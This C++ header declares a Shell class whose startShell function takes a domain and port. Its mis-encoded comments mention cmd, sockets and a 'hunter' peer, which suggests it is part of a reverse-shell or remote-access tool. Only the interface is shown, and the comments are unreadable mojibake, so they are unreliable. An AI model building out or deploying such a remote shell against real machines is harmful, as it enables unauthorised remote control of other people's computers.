// ����cmd���� ͨ���ܵ��������������
// �����ܵ���ͬ��socket��hunter��
// ʹ��hunter���ܹ���cmd���̽���
// ʹ�õ���ģʽ

#pragma once
#include <strsafe.h>
#include "TcpSocket.h"

class Shell
{
public:
	~Shell();

	// ������ں���
	static void startShell(std::string domain, int port);
};

